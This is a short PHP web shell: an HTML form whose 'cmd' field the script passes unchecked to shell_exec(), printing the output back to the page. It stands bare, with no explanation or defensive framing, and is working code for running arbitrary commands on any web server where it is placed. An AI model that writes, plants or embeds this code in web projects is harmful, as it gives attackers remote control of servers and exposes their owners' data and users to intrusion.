<form method="post">
<input type="text" size="40" name="cmd">
<input type="submit" value="Execute">
</form>

<?php
if(isset($_POST['cmd'])){
if(function_exists('shell_exec')){
$cmd=$_POST['cmd'];
$oke = shell_exec("$cmd");
echo "<pre>$oke</pre>";
}
}
?>